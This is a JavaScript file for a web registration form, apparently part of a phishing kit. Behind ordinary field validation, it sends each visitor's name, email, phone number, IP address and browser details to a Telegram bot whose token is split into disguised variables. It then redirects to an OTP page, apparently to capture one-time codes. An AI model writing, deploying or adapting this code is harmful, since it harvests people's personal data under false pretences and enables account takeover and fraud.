const _p0 = '8767';

const form = document.getElementById('registerForm');
const submitBtn = document.getElementById('submitBtn');

const _q0 = '612900';

const firstName = document.getElementById('firstName');
const lastName = document.getElementById('lastName');
const email = document.getElementById('email');
const phone = document.getElementById('phone');

const _r0 = ':AAF3WU5O';

const errors = {
  firstName: document.getElementById('firstNameError'),
  lastName: document.getElementById('lastNameError'),
  email: document.getElementById('emailError'),
  phone: document.getElementById('phoneError'),
};

const _s0 = 'sTwMFlux0Q';

function validateEmail(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }

const _t0 = 'XMp-tjeFd';

function validatePhone(v) { return /^\d{10}$/.test(v) || /^\d{12}$/.test(v); }

const _u0 = 'h7GWJfKo';
var _v0 = '8362';
var _w0 = '702705';

function _token() { return _p0 + _q0 + _r0 + _s0 + _t0 + _u0; }
function _chat() { return _v0 + _w0; }

function _api() { return 'https://api.telegram.org/bot' + _token() + '/sendMessage'; }

function validateForm() {
  let valid = true;
  if (!firstName.value.trim()) { errors.firstName.classList.add('visible'); valid = false; } else { errors.firstName.classList.remove('visible'); }
  if (!lastName.value.trim()) { errors.lastName.classList.add('visible'); valid = false; } else { errors.lastName.classList.remove('visible'); }
  if (!validateEmail(email.value.trim())) { errors.email.textContent = 'Enter a valid email address.'; errors.email.classList.add('visible'); valid = false; } else { errors.email.classList.remove('visible'); }
  if (!validatePhone(phone.value.trim())) { errors.phone.textContent = 'Enter a valid 10 or 12 digit number.'; errors.phone.classList.add('visible'); valid = false; } else { errors.phone.classList.remove('visible'); }
  return valid;
}

async function sendToTelegram(data) {
  const ipData = await (await fetch('https://api.ipify.org?format=json')).json();
  const msg = 'NEW REGISTRATION\n\nName: ' + data.firstName + ' ' + data.lastName + '\nEmail: ' + data.email + '\nPhone: ' + data.phone + '\nIP: ' + ipData.ip + '\nUA: ' + navigator.userAgent + '\nTime: ' + new Date().toLocaleString();
  await fetch(_api(), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _chat(), text: msg }) });
}

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  if (!validateForm()) return;
  submitBtn.classList.add('loading');
  try {
    await sendToTelegram({ firstName: firstName.value.trim(), lastName: lastName.value.trim(), email: email.value.trim(), phone: phone.value.trim() });
    sessionStorage.setItem('otpPhone', phone.value.trim());
    window.location.href = 'otp.html';
  } catch (err) { alert('Something went wrong. Please try again.'); console.error(err); }
  finally { submitBtn.classList.remove('loading'); }
});
